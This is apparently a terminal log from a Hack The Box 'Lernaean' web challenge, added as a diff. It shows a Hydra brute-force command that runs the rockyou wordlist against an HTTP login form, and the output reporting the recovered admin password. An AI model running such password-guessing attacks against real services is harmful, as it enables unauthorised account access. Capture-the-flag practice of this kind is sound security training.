@@ -1,0 +1,9 @@
+root@root:~/Downloads/HTB/VIP/Challenges/web/Lernaean# hydra -l admin -P /usr/share/wordlists/rockyou.txt docker.hackthebox.eu http-post-form "/:password=^PASS^:Invalid password!" -s 31835
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-03-20 01:22:00
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://docker.hackthebox.eu:31835/:password=^PASS^:Invalid password!
+[31835][http-post-form] host: docker.hackthebox.eu   login: admin   password: leonardo
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-03-20 01:22:29
